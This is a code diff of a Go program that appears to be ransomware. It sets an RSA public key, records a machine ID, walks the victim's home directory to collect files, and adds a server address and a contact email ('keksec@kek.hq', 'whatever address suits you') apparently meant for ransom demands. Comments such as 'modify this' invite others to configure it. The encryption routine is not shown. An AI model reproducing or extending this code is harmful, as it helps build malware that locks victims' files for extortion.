@@ -12,6 +12,7 @@ import (
 	"io"
 	"io/ioutil"
 	"log"
+	"math/big"
 	"net/http"
 	"net/url"
 	"os"
@@ -22,14 +23,26 @@ import (
 	"github.com/denisbrodbeck/machineid"
 )
 
+var Key rsa.PublicKey
+var server string = "example.com:1337" // server address
+var contact string = "keksec@kek.hq"   // whatever address suits you
+
+func FromBase10(base10 string) *big.Int {
+	i, ok := new(big.Int).SetString(base10, 10)
+	if !ok {
+		panic("bad number: " + base10)
+	}
+	return i
+}
+
 func init() {
 	Key = rsa.PublicKey{
-		N: fromBase10(""), // modify this
+		N: FromBase10(""), // modify this
 		E: 65537,
 	}
 }
 
-func visit(files *[]string) filepath.WalkFunc {
+func Visit(files *[]string) filepath.WalkFunc {
 	return func(path string, info os.FileInfo, err error) error {
 		if err != nil {
 			log.Fatal(err)
@@ -111,7 +124,7 @@ func main() {
 		home = os.Getenv("HOME")
 	}
 
-	err := filepath.Walk(home, visit(&files))
+	err := filepath.Walk(home, Visit(&files))
 	if err != nil {
 		panic(err)
 	}
